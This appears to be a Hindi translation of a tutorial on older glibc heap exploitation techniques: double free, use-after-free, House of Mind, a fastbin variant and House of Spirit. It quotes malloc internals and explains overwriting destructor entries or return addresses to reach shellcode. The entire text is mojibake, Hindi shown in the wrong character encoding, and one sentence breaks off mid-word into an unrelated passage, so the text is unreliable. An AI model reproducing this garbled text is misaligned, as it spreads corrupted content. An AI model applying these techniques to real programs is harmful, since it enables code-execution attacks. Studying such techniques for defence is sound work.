рдПрдХ рдмрдлрд╝рд░ рдЬрд┐рд╕реЗ рдбреЗрдЯрд╛ рдХреЗ рдЗрдирдкреБрдЯ рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

рдЗрд╕рдХреЗ рд╕рдВрдЧрдд рдПрдХ рдмрдлрд╝рд░ рдЬрд┐рд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рдлрд╝реАрд▓реНрдб fd рдЙрд╕рдХреЗ рдкрд┐рдЫрд▓реЗ рдмрдлрд╝рд░ рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рднрд░рд╛ рдЬрд╛рдПрдЧрд╛

рдПрдХ рдмрдлрд╝рд░ рдЬрд┐рд╕реЗ 512 рд╕реЗ рдЕрдзрд┐рдХ рд▓реЗрдХрд┐рди рдкрд┐рдЫрд▓реЗ рдмрдлрд╝рд░ рд╕реЗ рдХрдо рдЖрдХрд╛рд░ рдореЗрдВ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ

рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдЪрд░рдг 3 рдореЗрдВ рдШреЛрд╖рд┐рдд рдПрдХ рдмрдлрд╝рд░ рдЬреЛ рдЗрд╕рдХреЗ prev\_size рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

рдЗрд╕ рддрд░рд╣ рджреЛ mallocs рдХреЛ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдФрд░ рдПрдХ рдХреЗрд╡рд▓ рдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдЬрд┐рд╕реЗ рдХреЗрд╡рд▓ рдЙрд╕ рдПрдХ рдХреЛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рджреЛрд╣рд░реА рдореБрдХреНрддрд┐ рджреЛрд╖**

рдпрджрд┐ рдПрдХ рд╣реА рдкреЙрдЗрдВрдЯрд░ рдХреЗ рд╕рд╛рде рджреЛ рдмрд╛рд░ free() рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рджреЛ рдмрд┐рдиреНрд╕ рдПрдХ рд╣реА рдкрддреЗ рдХреА рдУрд░ рджреЗрдЦ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВред

рдпрджрд┐ рдХрд┐рд╕реА рдХреЛ рдлрд┐рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рдпреБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЕрдЧрд░ рдХрд┐рд╕реА рдЕрдиреНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рдПрдХ рд╣реА рд╕реНрдерд╛рди рдирд┐рдпреБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ "fd" рдФрд░ "bk" рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЛ рдлреЙрд▓реНрд╕рд┐рдлрд╛рдЗ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдкрд┐рдЫрд▓реА рдЖрд░рдХреНрд╖рдг рдХреЗ рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рд╣реЛрдЧрд╛ред

**рдлреНрд░реА() рдХреЗ рдмрд╛рдж**

рдПрдХ рдкреВрд░реНрд╡ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЙрдЗрдВрдЯрд░ рдлрд┐рд░ рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## **8 рд╣реАрдк рдУрд╡рд░рдлрд╝реНрд▓реЛ: рдЙрдиреНрдирдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕**

Unlink() рдФрд░ FrontLink() рддрдХрдиреАрдХреЛрдВ рдХреЛ unlink() рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдкрд░ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

**рдорд╛рдЗрдВрдб рдХрд╛ рдШрд░**

рдХреЗрд╡рд▓ рдПрдХ free() рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдХреЛрдб рдХреЛ рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдПрдХ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЦреЛрдЬрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдЬреЛ рдкрд╣рд▓реЗ рджреНрд╡рд╛рд░рд╛ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ free() рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ public\_fREe(mem) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рдХрд░рддрд╛ рд╣реИ:

mstate ar\_ptr;

mchunkptr p;

тАж

p = mem2chunk(mes); тАФ> рдЯреБрдХрдбрд╝реЗ рдХреА рд╢реБрд░реБрдЖрдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреЙрдЗрдВрдЯрд░ рд▓реМрдЯрд╛рддрд╛ рд╣реИ (mem-8)

тАж

ar\_ptr = arena\_for_chunk(p); тАФ> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

тАж

\_int\_free(ar\_ptr, mem);

}

\[1] рдореЗрдВ рдпрд╣ рджреЗрдЦрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЖрдХрд╛рд░ рдХрд╛ рдмрд┐рдЯ NON\_MAIN\_ARENA рд╣реИ, рдЬрд┐рд╕реЗ рд╣рдо рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рддреНрдп рд▓реМрдЯрд╛рдП рдФрд░ heap\_for\_ptr() рдХреЛ рдЪрд▓рд╛рдП рдЬреЛ "mem" рдкрд░ рдПрдХ рдФрд░ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ 2.5 рдмрд╛рдЗрдЯ рдХрдордЬреЛрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ (рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ 0x0804a000 рд╕реЗ 0x08000000 рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ) рдФрд░ 0x08000000->ar\_ptr рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рдПрдХ struct heap\_info рд╣реИ)

рдЗрд╕ рддрд░рд╣ рдЕрдЧрд░ рд╣рдо рдХрд┐рд╕реА рдЯреБрдХрдбрд╝реЗ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ 0x0804a000 рдФрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ **0x081002a0** рд╣рдо 0x08100000 рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬреЛ рдХреБрдЫ рднреА рдЪрд╛рд╣реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **0x0804a000**ред рдЬрдм рдпрд╣ рджреВрд╕рд░рд╛ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реЛрдЧрд╛ рддреЛ рд╡рд╣ рджреЗрдЦреЗрдЧрд╛ рдХрд┐ heap\_for\_ptr(ptr)->ar\_ptr 0x08100000 рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕рдиреЗ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ 0x081002a0 рдкрд░ рдФрд░ рдЙрд╕рдХреЗ рдкрд╣рд▓реЗ 5 рд╢реВрдиреНрдп рд╣реИрдВ рддреЛ рдЙрд╕рдиреЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдкрд╣рд▓реЗ 4 рдмрд╛рдЗрдЯ рдХрд╛ рдореВрд▓реНрдп рдХреНрдпрд╛ рд╣реИ, ar\_ptr)

рдЗрд╕ рддрд░рд╣ \_int\_free(ar\_ptr, mem) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
тАж\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рд╣рдо av рдХреЗ рдореВрд▓реНрдп рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╡рд╣ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рд▓рд┐рдЦрд╛ рд╣реИ рдЬреЛ рдореБрдХреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдЯреБрдХрдбрд╝рд╛ рд╣реИред

рдЬреИрд╕реЗ рд╣реА unsorted\_chunks рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╣рдо av->bins\[2] рдореЗрдВ \_\_DTOR\_END\_\_-12 рдХрд╛ рдорд╛рди рд▓рд┐рдЦрддреЗ рд╣реИрдВ рддреЛ рдЕрдВрддрд┐рдо рдирд┐рд░реНрджреЗрд╢рди рдореЗрдВ \_\_DTOR\_END\_\_ рдкрд░ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдкрддрд╛ред

рдЕрд░реНрдерд╛рдд, рдкрд╣рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рд╢реБрд░реБрдЖрдд рдореЗрдВ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдмрд╛рд░ \_\_DTOR\_END\_\_-12 рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╡рд╣рд╛рдВ рд╕реЗ рд╡рд╣ av->bins\[2] рдирд┐рдХрд╛рд▓реЗрдЧрд╛ред

рдЬрд┐рд╕ рдкрддреЗ рдкрд░ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдкрддрд╛ рд▓
рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ рдЬреЛ рдкреЗрд▓реЛрдб рдХреЛ рдереЛрдбрд╝рд╛ рдФрд░ рдЬрдЯрд┐рд▓ рдмрдирд╛ рджреЗрддреА рд╣реИрдВред

рдпрд╣ рддрдХрдиреАрдХ рдЕрдм рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕реА рдкреИрдЪ рдХреЛ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЬреЛ unlink рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдирдП рд╕рд╛рдЗрдЯ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрд╕реА рдХреЛ рдирд┐рд╢рд╛рдирд╛ рдмрдирд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

**Fastbin**

рдпрд╣ The house of mind рдХрд╛ рдПрдХ рднрд┐рдиреНрди рд╕рдВрд╕реНрдХрд░рдг рд╣реИред

рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ \_int\_free() рдХреЗ рдкрд╣рд▓реЗ рд╕рддреНрдпрд╛рдкрди рдХреЗ рдмрд╛рдж рдкрд╣реБрдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред

fb = &(av->fastbins\[fastbin\_index(size)] тАФ> рдЬреЛ fastbin\_index(sz) тАФ> (sz >> 3) - 2 рд╣реИ

тАж

p->fd = \*fb

\*fb = p

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ "fb" рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ рдХрд┐ рд░реЗрддрд╛рдЧрд╛рдбрд╝реА dtors рдХреЗ рдкрддреЛрдВ рдХреЗ рдкрд╛рд╕ рд╣реЛред рдЕрдзрд┐рдХ рд╕рдЯреАрдХрддрд╛ рд╕реЗ рдХрд╣реЗрдВ рддреЛ av->max\_fast рдЙрд╕ рдкрддреЗ рдкрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╣рдо рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

The House of Mind рдХреЗ рд╕рд╛рде рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╣рдо рдПрд╡реА рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рдереЗред

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдХрд╛рд░ рдлрд╝реАрд▓реНрдб рдореЗрдВ рд╣рдо 8 + NON\_MAIN\_ARENA + PREV\_INUSE рдХрд╛ рдЖрдХрд╛рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВ тАФ> fastbin\_index() рд╣рдореЗрдВ fastbins\[-1] рд╡рд╛рдкрд╕ рдХрд░реЗрдЧрд╛, рдЬреЛ av->max\_fast рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░реЗрдЧрд╛ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ av->max\_fast рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдирд┐рд╢рд╛рдирд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдмрд▓реНрдХрд┐ рдЙрд╕ рд╕реНрдерд╛рди рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЙрд╕ рдЙрдЪрд┐рдд рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП -> рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╣реИ, рдЗрд╕ рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рдХреЗрд╡рд▓ 8 рд╕реЗ рдЕрдзрд┐рдХ рдЖрдХрд╛рд░ рдбрд╛рд▓рдирд╛ рд╣реИ (рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╢реИрд▓рдХреЛрдб рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдПрдХ рдЬреЗрдПрдордкреА рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдиреЙрдкреНрд╕ рдореЗрдВ рдЧрд┐рд░рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ)ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЙрд╕реА рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдХрд╛ av->system\_mem рд╕реЗ рдХрдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред av->system\_mem 1848 рдмрд╛рдЗрдЯ рджреВрд░ рд╣реИред

\_DTOR\_END\_ рдХреЗ рд╢реВрдиреНрдпреЛрдВ рдФрд░ GOT рдореЗрдВ рдХреБрдЫ рд╣реА рдкрддреЛрдВ рдХреЗ рдХрд╛рд░рдг, рдЗрди рд╕реЗрдХреНрд╢рдиреЛрдВ рдХрд╛ рдХреЛрдИ рдкрддрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЪрд▓рддреЗ рд╣реИрдВ рдХрд┐ рдкрд╛рдЗрд▓рд╛ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП fastbin рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВред

рдПрдХ рдФрд░ рд╣рдорд▓реЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ **av** рдХреЛ рдкрд╛рдЗрд▓реЗ рдХреА рдУрд░ рдкреБрдирд░реНрджрд┐рд╢рд╛ рдХрд░рдирд╛ред

рдпрджрд┐ рд╣рдо рдЖрдХрд╛рд░ рдХреЛ 8 рдХреА рдмрдЬрд╛рдп 16 рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ: fastbin\_index() рд╣рдореЗрдВ fastbins\[0] рд╡рд╛рдкрд╕ рдХрд░реЗрдЧрд╛ рдФрд░ рд╣рдо рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд╛рдЗрд▓реЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдкрд╛рдЗрд▓реЗ рдореЗрдВ рдХреЛрдИ рдХреИрдирд░реА рдпрд╛ рдЕрдЬреАрдм рдореВрд▓реНрдп рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдореЗрдВ рдЗрд╕рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП: 4 рдмрд╛рдЗрдЯ рд╢реВрдиреНрдп + EBP + RET

4 рдмрд╛рдЗрдЯ рд╢реВрдиреНрдп рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ **av** рдЗрд╕ рдкрддреЗ рдкрд░ рд╣реЛрдЧрд╛ рдФрд░ **av** рдХрд╛ рдкрд╣рд▓рд╛ рддрддреНрд╡ рд╡рд╣ mutex рд╣реИ рдЬрд┐рд╕реЗ 0 рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

**av->max\_fast** EBP рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣ рдПрдХ рдореВрд▓реНрдп рд╣реЛрдЧрд╛ рдЬреЛ рд╣рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛ред

**av->fastbins\[0]** рдХреЛ **p** рдХреЗ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ RET рд╣реЛрдЧрд╛, рдЗрд╕ рддрд░рд╣ рд╢реИрд▓рдХреЛрдб рдкрд░ рдЙрдЫрд▓рд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **av->system\_mem** (рдкрд╛рдЗрд▓реЗ рдореЗрдВ рд╕реНрдерд┐рддрд┐ рд╕реЗ 1484 рдмрд╛рдЗрдЯ рдКрдкрд░) рдореЗрдВ рдХрд╛рдлреА рдХрдЪрд░рд╛ рд╣реЛрдЧрд╛ рдЬреЛ рд╣рдореЗрдВ рдЬрд╛рдВрдЪ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЙрд╕ рддреБрдХрдбрд╝реЗ рдХреЗ рдЖрд╕рдкрд╛рд╕реА рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП -> рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рдЙрд╕ рддреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 16 рд╣реИ, рдЗрд╕ рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рдХреЗрд╡рд▓ 8 рд╕реЗ рдЕрдзрд┐рдХ рдЖрдХрд╛рд░ рдбрд╛рд▓рдирд╛ рд╣реИ (рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╢реИрд▓рдХреЛрдб рдЙрд╕ рддреБрдХрдбрд╝реЗ рдореЗрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдПрдХ рдЬреЗрдПрдордкреА рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдиреЙрдкреНрд╕ рдХреЗ рдмрд╛рдж рдирдХрд▓реА рддреБрдХрдбрд╝реЗ рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдлрд╝реАрд▓реНрдб рдХреЗ рдмрд╛рдж рдЧрд┐рд░реЗрдЧрд╛)ред

**The House of Spirit**

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдПрдХ malloc рдХреЗ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдПрдХ рдРрд╕реЗ рд╕реНрдерд╛рди рдкрд░ рдкрд╛рдирд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЬрд╣рд╛рдВ рдПрдХ рдЪрд░рдг рдХреЛ рдПрдХ рдЪрд░рдг рдХреЗ рдиреАрдЪреЗ рд╕реНрдЯреИрдХ рдкрд░ рдУрд╡рд░рдлреНрд▓реЛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред

рдЗрд╕ рддрд░рд╣, рд╣рдо рдЗрд╕ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдХрд╣реАрдВ рднреА рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рд░ рд╕реНрдерд╛рди рд╡реИрдз рдирд╣реАрдВ рд╣реИ, рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ av->max\_fast рд╕реЗ рдХрдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ рднрд╡рд┐рд╖реНрдп рдХреЗ malloc() рдХреЙрд▓ рдореЗрдВ рдорд╛рдВрдЧреА рдЧрдИ рдЖрдХрд╛рд░ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕ рдкреЙрдЗрдВрдЯрд░ рдХреЗ рдиреАрдЪреЗ malloc(40) рдХреЙрд▓ рдХреА рдЬрд╛рдПрдЧреА, рддреЛ рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 48 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рдкреВрдЫрддрд╛ рд╣реИ рддреЛ рд╣рдо 48 рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ malloc рдХреЗ рдкрд░рд┐рд╡рд░реНрддрдирд╢реАрд▓ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдЕрдЧрд▓реЗ 4 рдмрд╛рдЗрдЯреЛрдВ (рдЬреЛ рднрд╛рдЧреНрдп рд╕реЗ EBP рдХреЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рддрд░рд╣ 48 рдкреАрдЫреЗ рд░рд╣ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рдЖрдХрд╛рд░ рд╣реИ) рдХреА рдУрд░ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкрддрд╛ ptr-4+48 рдХрдИ рд╢рд░реНрддреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдирд╛ 